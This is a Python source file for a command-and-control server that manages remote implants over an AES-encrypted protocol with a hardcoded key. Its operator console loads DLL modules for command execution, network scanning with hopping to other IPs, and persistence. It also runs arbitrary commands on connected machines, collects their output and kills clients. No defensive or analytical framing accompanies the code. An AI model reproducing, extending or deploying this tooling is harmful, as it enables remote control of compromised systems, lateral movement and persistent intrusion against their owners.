import os
import socket
import sqlite3
import struct
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, Optional, Tuple

try:
    import pefile
except ImportError:
    pefile = None

try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ImportError:
    print("[!] cryptography library not found. Run: pip install cryptography")
    sys.exit(1)


AES_KEY_SIZE = 32
AES_BLOCK_BITS = 128
KEY_TEXT = "If you see this, get a life!!!"

LOGS_DIR = "logs"
SERVER_LOG_FILE = "server.log"
DEFAULT_TOOL_LOG_FILE = "default.log"

SIZE_FMT = "<I"
HEADER_FMT = "<II"  # command_id, data_length
SIZE_LEN = struct.calcsize(SIZE_FMT)
HEADER_LEN = struct.calcsize(HEADER_FMT)

CMD_KEEP_ALIVE = 0
CMD_GET_CONFIGURATION = 1
CMD_SET_TOOL_ID = 2
CMD_LOAD = 3

COMMAND_NAMES = {
    CMD_KEEP_ALIVE: "KEEP_ALIVE",
    CMD_GET_CONFIGURATION: "GET_CONFIGURATION",
    CMD_SET_TOOL_ID: "SET_TOOL_ID",
    CMD_LOAD: "LOAD",
}

CLI_COMMAND_NAMES = {
    CMD_KEEP_ALIVE: "TERMINATE",
    CMD_GET_CONFIGURATION: "GET_CONFIGURATION",
    CMD_SET_TOOL_ID: "SET_TOOL_ID",
    CMD_LOAD: "LOAD",
}

CMD_UNLOAD = 4

CMD_EXECUTE = 5

COMMAND_NAMES[CMD_UNLOAD] = "UNLOAD"
CLI_COMMAND_NAMES[CMD_UNLOAD] = "UNLOAD"

COMMAND_NAMES[CMD_EXECUTE] = "EXECUTE"
CLI_COMMAND_NAMES[CMD_EXECUTE] = "EXECUTE"

def pe_inspect_exports(data: bytes) -> tuple[bool, set[str]]:
    exports: set[str] = set()

    if pefile is None:
        return False, exports

    try:
        pe = pefile.PE(data=data, fast_load=True)
        try:
            is_dll = bool(pe.FILE_HEADER.Characteristics & 0x2000)

            pe.parse_data_directories(
                directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
            )
            if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
                for sym in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                    if sym.name:
                        exports.add(sym.name.decode("ascii", errors="replace"))
            return is_dll, exports
        finally:
            pe.close()
    except Exception:
        return False, exports


def get_required_exports_for_slot(slot: int) -> set[str]:
    required: set[str] = set()
    if slot == 0:
        required |= {"CmdManager_ExecuteCmd"}
    elif slot == 1:
        required |= {"NetManager_ScanNet", "NetManager_HopToIp"}
    elif slot == 2:
        required |= {"PersistencyManager_CreatePersistency"}
    return required


def build_unload_payload(slot: int) -> bytes:
    return bytes([slot])


def build_execute_payload(exec_id: str, command: str) -> bytes:
    exec_id_b = exec_id.encode("ascii", errors="strict")
    cmd_b = command.encode("utf-8", errors="replace")
    return struct.pack("<I", len(exec_id_b)) + exec_id_b + cmd_b


def split_execute_payload(data: bytes) -> tuple[Optional[str], Optional[bytes]]:
    if not data or len(data) < 4:
        return None, None
    exec_len = struct.unpack_from("<I", data, 0)[0]
    if exec_len == 0 or exec_len > 256:
        return None, None
    if 4 + exec_len > len(data):
        return None, None
    exec_id_b = data[4 : 4 + exec_len]
    try:
        exec_id = exec_id_b.decode("ascii", errors="strict")
    except Exception:
        return None, None
    rest = data[4 + exec_len :]
    return exec_id, rest


def _timestamp() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _derive_static_key() -> bytes:
    key = KEY_TEXT.encode("utf-8")
    if len(key) >= AES_KEY_SIZE:
        return key[:AES_KEY_SIZE]
    return key + (b"\x00" * (AES_KEY_SIZE - len(key)))


class LogManager:
    _locks_guard = threading.Lock()
    _locks_by_path: Dict[str, threading.Lock] = {}

    def __init__(self, logs_dir: str, log_filename: str) -> None:
        self._logs_dir = logs_dir
        os.makedirs(self._logs_dir, exist_ok=True)

        self._path = os.path.join(self._logs_dir, log_filename)

        with LogManager._locks_guard:
            lock = LogManager._locks_by_path.get(self._path)
            if lock is None:
                lock = threading.Lock()
                LogManager._locks_by_path[self._path] = lock
            self._lock = lock

    @property
    def path(self) -> str:
        return self._path

    def _format_info(self, message: str) -> str:
        return f"[{_timestamp()}] [INFO] {message}"

    def _format_error(self, message: str, exc: Optional[BaseException]) -> str:
        if exc is None:
            return f"[{_timestamp()}] [ERROR] {message}"
        return f"[{_timestamp()}] [ERROR] {message} | {exc}"

    def _write_line(self, line: str) -> None:
        try:
            with self._lock:
                with open(self._path, "a", encoding="utf-8") as f:
                    f.write(line + "\n")
        except Exception:
            pass

    def info(self, message: str) -> None:
        self._write_line(self._format_info(message))

    def error(self, message: str, exc: Optional[BaseException] = None) -> None:
        self._write_line(self._format_error(message, exc))


class Transport:
    def __init__(self, sock: socket.socket):
        self._sock = sock

    def sendall(self, data: bytes) -> None:
        self._sock.sendall(data)

    def recv_exact(self, n: int) -> Optional[bytes]:
        data = bytearray()
        while len(data) < n:
            chunk = self._sock.recv(n - len(data))
            if not chunk:
                return None
            data.extend(chunk)
        return bytes(data)

    def close(self) -> None:
        try:
            self._sock.close()
        except Exception:
            pass


class CryptoBox:
    def __init__(self, key: bytes):
        self._key = key

    def set_key(self, key: bytes) -> None:
        self._key = key

    def encrypt(self, plaintext: bytes) -> bytes:
        padder = padding.PKCS7(AES_BLOCK_BITS).padder()
        padded = padder.update(plaintext) + padder.finalize()
        cipher = Cipher(algorithms.AES(self._key), modes.ECB(), backend=default_backend())
        enc = cipher.encryptor()
        return enc.update(padded) + enc.finalize()

    def decrypt(self, ciphertext: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(self._key), modes.ECB(), backend=default_backend())
        dec = cipher.decryptor()
        padded = dec.update(ciphertext) + dec.finalize()
        unpadder = padding.PKCS7(AES_BLOCK_BITS).unpadder()
        return unpadder.update(padded) + unpadder.finalize()


class ProtocolCodec:
    def encode_message(self, command_id: int, data: bytes) -> bytes:
        return struct.pack(HEADER_FMT, command_id, len(data)) + data

    def decode_message(self, payload: bytes) -> Tuple[Optional[int], Optional[int], Optional[bytes]]:
        if len(payload) < HEADER_LEN:
            return None, None, None

        command_id, data_len = struct.unpack(HEADER_FMT, payload[:HEADER_LEN])
        data = payload[HEADER_LEN:]
        if data_len != len(data):
            return None, None, None

        return command_id, data_len, data

    def frame(self, payload: bytes) -> bytes:
        return struct.pack(SIZE_FMT, len(payload)) + payload


class ConfigStore:
    def __init__(self, db_path: str) -> None:
        self._db_path = db_path
        self._init_db()

    def _connect(self) -> sqlite3.Connection:
        return sqlite3.connect(self._db_path, timeout=5)

    def _init_db(self) -> None:
        try:
            with self._connect() as conn:
                conn.execute(
                    "CREATE TABLE IF NOT EXISTS configuration ("
                    "ConfigurationId TEXT PRIMARY KEY, "
                    "SleepTime INTEGER NOT NULL"
                    ")"
                )
        except Exception:
            # If DB init fails, queries will fail too; server will log on use.
            pass

    def get_sleep_time(self, configuration_id: str) -> Optional[int]:
        try:
            with self._connect() as conn:
                row = conn.execute(
                    "SELECT SleepTime FROM configuration WHERE ConfigurationId = ? LIMIT 1",
                    (configuration_id,),
                ).fetchone()
                if row is None:
                    return None
                return int(row[0])
        except Exception:
            return None


@dataclass
class ConnectedTool:
    transport: Transport
    client_id: int
    address: Tuple[str, int]
    log_file: str
    logger: LogManager
    codec: ProtocolCodec = field(default_factory=ProtocolCodec)
    last_keep_alive: float = field(default_factory=time.time)
    aes_key: bytes = field(default_factory=_derive_static_key)
    is_encrypted: bool = True
    tool_id: Optional[int] = None
    stop_event: threading.Event = field(default_factory=threading.Event)
    crypto: CryptoBox = field(init=False)

    def __post_init__(self) -> None:
        self.crypto = CryptoBox(self.aes_key)

    def log(self, message: str) -> None:
        self.logger.info(message)

    def close(self) -> None:
        self.transport.close()

    def set_key(self, key: bytes) -> None:
        self.aes_key = key
        self.crypto.set_key(key)

    def receive_command(self) -> Tuple[Optional[int], Optional[int], Optional[bytes]]:
        size_data = self.transport.recv_exact(SIZE_LEN)
        if not size_data:
            return None, None, None

        (packet_size,) = struct.unpack(SIZE_FMT, size_data)
        payload = self.transport.recv_exact(packet_size) if packet_size else b""
        if payload is None:
            return None, None, None

        if self.is_encrypted:
            payload = self.crypto.decrypt(payload)

        return self.codec.decode_message(payload)

    def send_command(self, command_id: int, data: bytes) -> None:
        payload = self.codec.encode_message(command_id, data)
        if self.is_encrypted:
            payload = self.crypto.encrypt(payload)
        self.transport.sendall(self.codec.frame(payload))


class CoolServer:
    def __init__(self, host: str = "127.0.0.1", port: int = 8080):
        self.host = host
        self.port = port

        self.server_socket: Optional[socket.socket] = None
        self.running = False

        self.lock = threading.Lock()
        self.cli_input_lock = threading.Lock()

        self.connected_tools: Dict[int, ConnectedTool] = {}
        self.next_client_id = 1

        self.logger = LogManager(LOGS_DIR, SERVER_LOG_FILE)
        self.config_store = ConfigStore("Database.db")

    # --- logging ---

    def log_server(self, message: str) -> None:
        self.logger.info(message)

    # --- internal helpers ---

    def _get_tool(self, client_id: int) -> Optional[ConnectedTool]:
        with self.lock:
            return self.connected_tools.get(client_id)

    def _read_file_bytes(self, path: str) -> tuple[Optional[bytes], Optional[str]]:
        try:
            with open(path, "rb") as f:
                return f.read(), None
        except Exception as e:
            return None, str(e)

    def _tool_outputs_dir(self, tool: ConnectedTool) -> str:
        tool_part = hex(tool.tool_id) if tool.tool_id is not None else "unknown"
        return os.path.join("outputs", tool_part)

    def _output_file_path(self, tool: ConnectedTool, exec_id: str) -> str:
        return os.path.join(self._tool_outputs_dir(tool), f"{exec_id}.output")

    def _generate_unique_exec_id(self, tool: ConnectedTool) -> str:
        out_dir = self._tool_outputs_dir(tool)
        os.makedirs(out_dir, exist_ok=True)
        # Unique per tool output directory.
        while True:
            exec_id = uuid.uuid4().hex
            if not os.path.exists(self._output_file_path(tool, exec_id)):
                return exec_id

    def _append_execute_output(self, tool: ConnectedTool, exec_id: str, chunk: bytes) -> Optional[str]:
        try:
            out_dir = self._tool_outputs_dir(tool)
            os.makedirs(out_dir, exist_ok=True)
            out_path = self._output_file_path(tool, exec_id)
            with open(out_path, "ab") as f:
                f.write(chunk)
            return None
        except Exception as e:
            return str(e)

    def _validate_load_payload(self, slot: int, path: str, file_data: bytes) -> Optional[str]:
        if not path.lower().endswith(".dll"):
            return "File must have .dll extension"

        if pefile is None:
            return "Missing dependency: pefile (pip install pefile)"

        is_dll, exports = pe_inspect_exports(file_data)
        if not is_dll:
            return "File is not marked as a DLL"
        
        required = get_required_exports_for_slot(slot)
        missing = sorted([name for name in required if name not in exports])
        if missing:
            return "DLL is missing exports: %s" % ", ".join(missing)

        return None

    def _handle_keep_alive(self, tool: ConnectedTool, cmd_name: str) -> None:
        tool.last_keep_alive = time.time()
        tool.log(f"RECEIVED: {cmd_name}")

    def _handle_get_configuration(self, tool: ConnectedTool, cmd_name: str, command_data: Optional[bytes]) -> None:
        config_id = (command_data or b"").decode("utf-8", errors="replace").strip()
        sleep_time = self.config_store.get_sleep_time(config_id)
        if sleep_time is None:
            self.logger.error(f"ConfigurationId not found: {config_id}")
            sleep_time = 10

        tool.send_command(CMD_GET_CONFIGURATION, struct.pack("<I", sleep_time))
        tool.log(f"RECEIVED: {cmd_name} -> ConfigurationId={config_id} SleepTime={sleep_time}")

    def _handle_set_tool_id(self, tool: ConnectedTool, cmd_name: str, data_length: Optional[int], command_data: Optional[bytes]) -> None:
        if data_length is None or data_length < 4 or not command_data:
            tool.log(f"RECEIVED: {cmd_name} (invalid payload)")
            return

        tool_id = struct.unpack("<I", command_data[:4])[0]
        tool.tool_id = tool_id
        tool.logger = LogManager(LOGS_DIR, f"{hex(tool_id)}.log")
        tool.log_file = tool.logger.path
        tool.log(f"RECEIVED: {cmd_name} -> ToolID={hex(tool_id)}")

    def _handle_load(self, tool: ConnectedTool, cmd_name: str, data_length: Optional[int], command_data: Optional[bytes]) -> None:
        # Payload is binary; don't decode.
        tool.log(f"RECEIVED: {cmd_name} ({len(command_data or b'')} bytes)")

    def _handle_unload(self, tool: ConnectedTool, cmd_name: str, data_length: Optional[int], command_data: Optional[bytes]) -> None:
        # Payload is binary; don't decode.
        tool.log(f"RECEIVED: {cmd_name} ({len(command_data or b'')} bytes)")

    def _handle_execute(self, tool: ConnectedTool, cmd_name: str, data_length: Optional[int], command_data: Optional[bytes]) -> None:
        # Tool sends back: <u32 exec_id_len><exec_id ascii><output chunk bytes>
        exec_id, chunk = split_execute_payload(command_data or b"")
        if not exec_id or chunk is None:
            tool.log(f"RECEIVED: {cmd_name} (invalid payload)")
            return

        err = self._append_execute_output(tool, exec_id, chunk)
        if err:
            self.logger.error(f"Failed appending execute output: tool={tool.tool_id} exec_id={exec_id} - {err}")
            tool.log(f"RECEIVED: {cmd_name} (append failed)")
            return

        tool.log(f"RECEIVED: {cmd_name} -> exec_id={exec_id} ({len(chunk)} bytes)")

    def _print_cli_help(self) -> None:
        print("\n[*] CLI Commands:")
        print("  help                     - Show this help message")
        print("  list                     - List connected clients")
        print("  logs                     - List available logs")
        print("  logs <name>              - Show a log file")
        print("  kill <id>                - Send terminate command (ID 0) to client")
        print("  getconfig <id>           - Send get configuration command (ID 1) to client")
        print("  load <id> <0|1|2> <path> - Send load command (ID 3) to client")
        print("  unload <id> <0|1|2>      - Send unload command (ID 4) to client")
        print("  execute <id> <cmd>        - Execute cmd and stream output (ID 5)")
        print("  exit                     - Stop server and exit")
        print()

    def _cli_unload(self, user_input: str) -> None:
        parts = user_input.split(maxsplit=2)
        if len(parts) < 3:
            print("[!] Usage: unload <id> <0|1|2>")
            return

        try:
            client_id = int(parts[1])
            slot = int(parts[2])
        except ValueError:
            print("[!] Invalid id/slot")
            return

        if slot not in (0, 1, 2):
            print("[!] Slot must be 0, 1, or 2")
            return

        self.send_command_to_client(client_id, CMD_UNLOAD, build_unload_payload(slot))

    def _cli_execute(self, user_input: str) -> None:
        parts = user_input.split(maxsplit=2)
        if len(parts) < 3:
            print("[!] Usage: execute <id> <cmd>")
            return

        try:
            client_id = int(parts[1])
        except ValueError:
            print("[!] Invalid client ID")
            return

        tool = self._get_tool(client_id)
        if not tool:
            print(f"[!] No client with ID {client_id}")
            return
        if tool.tool_id is None:
            print("[!] Tool has no tool_id yet (wait for SET_TOOL_ID)")
            return

        cmd_text = parts[2]
        exec_id = self._generate_unique_exec_id(tool)
        out_path = self._output_file_path(tool, exec_id)

        try:
            # Create the output file up front.
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, "ab"):
                pass
        except Exception as e:
            print(f"[!] Failed creating output file: {e}")
            return

        payload = build_execute_payload(exec_id, cmd_text)
        ok = self.send_command_to_client(client_id, CMD_EXECUTE, payload)
        if ok:
            print(f"[*] Sent execute: exec_id={exec_id}")
            print(f"[*] Output: {out_path}")

    def _cli_logs(self, parts: list[str]) -> None:
        logs_dir = LOGS_DIR
        try:
            os.makedirs(logs_dir, exist_ok=True)
        except Exception:
            pass

        if len(parts) < 2:
            try:
                names = []
                for name in os.listdir(logs_dir):
                    if not name.lower().endswith(".log"):
                        continue
                    base, _ext = os.path.splitext(name)
                    names.append(base)
                names.sort()

                if not names:
                    print("[*] No log files\n")
                else:
                    print(f"\n[*] Logs ({len(names)}):\n")
                    for n in names:
                        print(f"  - {n}")
                    print("\n[*] Usage: logs <name>\n")
            except Exception as e:
                print(f"[!] Failed listing logs: {e}\n")
            return

        log_name = parts[1]
        log_path = os.path.join(logs_dir, log_name + ".log")
        if not os.path.exists(log_path):
            print(f"[!] Log not found: {log_name}")
            return

        try:
            size = os.path.getsize(log_path)
            print(f"\n[*] Log: {log_name} ({size} bytes)")
            print("=" * 80)
            with open(log_path, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    print(line.rstrip("\n"))
            print("=" * 80)
            print()
        except Exception as e:
            print(f"[!] Failed reading log '{log_name}': {e}")

    def _cli_load(self, user_input: str) -> None:
        parts = user_input.split(maxsplit=3)
        if len(parts) < 4:
            print("[!] Usage: load <id> <0|1|2> <path>")
            return

        try:
            client_id = int(parts[1])
            slot = int(parts[2])
        except ValueError:
            print("[!] Invalid id/slot")
            return

        if slot not in (0, 1, 2):
            print("[!] Slot must be 0, 1, or 2")
            return

        path = parts[3]
        file_data, err = self._read_file_bytes(path)
        if file_data is None:
            print(f"[!] Failed reading file: {err}")
            return

        validation_error = self._validate_load_payload(slot, path, file_data)
        if validation_error:
            print(f"[!] {validation_error}")
            return

        payload = bytes([slot]) + file_data
        self.send_command_to_client(client_id, CMD_LOAD, payload)

    # --- lifecycle / cleanup ---

    def cleanup_tool(self, client_id: int, reason: Optional[str] = None) -> None:
        with self.lock:
            tool = self.connected_tools.pop(client_id, None)

        if not tool:
            return

        tool.stop_event.set()

        tool.close()

        msg = f"Client disconnected{f' ({reason})' if reason else ''}"
        tool.log(msg)

        if tool.tool_id is not None:
            self.log_server(
                f"Client {client_id} (ToolID: {hex(tool.tool_id)}) disconnected{f' ({reason})' if reason else ''}"
            )
        else:
            self.log_server(
                f"Client {client_id} disconnected{f' ({reason})' if reason else ''}"
            )

    def cleanup_all_tools(self) -> None:
        with self.lock:
            client_ids = list(self.connected_tools.keys())
        for client_id in client_ids:
            self.cleanup_tool(client_id, reason="server cleanup")

    # --- threads ---

    def accept_connections(self) -> None:
        while self.running:
            try:
                if not self.server_socket:
                    break
                client_socket, address = self.server_socket.accept()
                client_id = self.next_client_id
                self.next_client_id += 1

                tool = ConnectedTool(
                    transport=Transport(client_socket),
                    client_id=client_id,
                    address=address,
                    log_file="",
                    logger=LogManager(LOGS_DIR, DEFAULT_TOOL_LOG_FILE),
                )

                tool.log_file = tool.logger.path

                with self.lock:
                    self.connected_tools[client_id] = tool

                tool.log(f"Client connected from {address}")
                self.log_server(f"Client {client_id} connected from {address}")

                threading.Thread(
                    target=self.handle_client,
                    args=(client_id, tool.stop_event),
                    daemon=True,
                ).start()

            except Exception as e:
                if self.running:
                    self.logger.error("accept_connections error", e)

    def handle_client(self, client_id: int, stop_event: threading.Event) -> None:
        reason = None
        try:
            while self.running and not stop_event.is_set():
                tool = self._get_tool(client_id)
                if not tool:
                    reason = "tool removed"
                    break

                command_id, data_length, command_data = tool.receive_command()

                if command_id is None:
                    reason = "receive failed"
                    break

                cmd_name = COMMAND_NAMES.get(command_id, f"UNKNOWN({command_id})")

                if command_id == CMD_KEEP_ALIVE:
                    self._handle_keep_alive(tool, cmd_name)
                elif command_id == CMD_GET_CONFIGURATION:
                    self._handle_get_configuration(tool, cmd_name, command_data)
                elif command_id == CMD_SET_TOOL_ID:
                    self._handle_set_tool_id(tool, cmd_name, data_length, command_data)
                elif command_id == CMD_LOAD:
                    self._handle_load(tool, cmd_name, data_length, command_data)
                elif command_id == CMD_UNLOAD:
                    self._handle_unload(tool, cmd_name, data_length, command_data)
                elif command_id == CMD_EXECUTE:
                    self._handle_execute(tool, cmd_name, data_length, command_data)

        except Exception as e:
            reason = f"exception: {e}"
            self.logger.error(f"Client {client_id}: Error in handle_client", e)

        finally:
            self.cleanup_tool(client_id, reason=reason)

    def killer_thread(self) -> None:
        while self.running:
            time.sleep(10000)
            now = time.time()
            with self.lock:
                stale_ids = [
                    cid
                    for cid, tool in self.connected_tools.items()
                    if (now - tool.last_keep_alive) > 50
                ]

            for client_id in stale_ids:
                tool = self.connected_tools.get(client_id)
                if tool:
                    try:
                        tool.send_command(0, b"")
                    except Exception:
                        pass
                self.cleanup_tool(client_id, reason="keep-alive timeout")

    # --- CLI ---

    def send_command_to_client(self, client_id: int, command_id: int, data: bytes) -> bool:
        tool = self._get_tool(client_id)
        if not tool:
            print(f"[!] No client with ID {client_id}")
            return False

        cmd_name = CLI_COMMAND_NAMES.get(command_id, f"CMD({command_id})")
        try:
            tool.send_command(command_id, data)
            tool.log(f"SENT: {cmd_name}")
            return True
        except Exception as e:
            print(f"[!] Error sending to client {client_id}: {e}")
            return False

    def list_clients(self) -> None:
        with self.lock:
            items = list(self.connected_tools.items())

        if not items:
            print("[*] No connected clients")
            return

        print("\n[*] Connected clients:")
        print("-" * 80)
        print(f"{'ID':<5} {'Tool ID':<10} {'IP':<20} {'Last Keep-Alive':<20} Encrypted")
        print("-" * 80)
        now = time.time()
        for client_id, tool in items:
            time_since = now - tool.last_keep_alive
            tool_id_str = hex(tool.tool_id) if tool.tool_id is not None else "N/A"
            print(
                f"{client_id:<5} {tool_id_str:<10} {tool.address[0]:<20} {f'{time_since:.1f}s ago':<20} {tool.is_encrypted}"
            )
        print("-" * 80)

    def cli_loop(self) -> None:
        self._print_cli_help()

        while self.running:
            try:
                with self.cli_input_lock:
                    user_input = input("server> ").strip()
                if not user_input:
                    continue

                parts = user_input.split(maxsplit=2)
                cmd = parts[0].lower()

                if cmd == "help":
                    self._print_cli_help()

                elif cmd == "list":
                    self.list_clients()

                elif cmd == "logs":
                    self._cli_logs(parts)

                elif cmd == "kill":
                    if len(parts) < 2:
                        print("[!] Usage: kill <id>")
                        continue
                    try:
                        client_id = int(parts[1])
                        self.send_command_to_client(client_id, 0, b"")
                        self.cleanup_tool(client_id, reason="killed by operator")
                    except ValueError:
                        print("[!] Invalid client ID")

                elif cmd == "getconfig":
                    if len(parts) < 2:
                        print("[!] Usage: getconfig <id>")
                        continue
                    try:
                        client_id = int(parts[1])
                        config_data = struct.pack("<I", 10)
                        self.send_command_to_client(client_id, 1, config_data)
                    except ValueError:
                        print("[!] Invalid client ID")

                elif cmd == "load":
                    self._cli_load(user_input)

                elif cmd == "unload":
                    self._cli_unload(user_input)

                elif cmd == "execute":
                    self._cli_execute(user_input)

                elif cmd == "exit":
                    print("[*] Shutting down server...")
                    self.running = False
                    break

                else:
                    print("[!] Unknown command")

            except EOFError:
                print("\n[*] Shutting down server...")
                self.running = False
                break
            except Exception as e:
                print(f"[!] CLI Error: {e}")

        self.cleanup()

    def cleanup(self) -> None:
        self.cleanup_all_tools()
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        print("[*] Server stopped")

    # --- entry ---

    def start(self) -> None:
        # Backwards-compatible entry point.
        self.run()

    def run(self) -> None:
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        self.running = True

        print(f"[*] Server started on {self.host}:{self.port}")
        print("[*] Waiting for connections...")

        threading.Thread(target=self.accept_connections, daemon=True).start()
        threading.Thread(target=self.killer_thread, daemon=True).start()

        self.cli_loop()


def main() -> None:
    CoolServer("127.0.0.1", 8080).run()


if __name__ == "__main__":
    main()
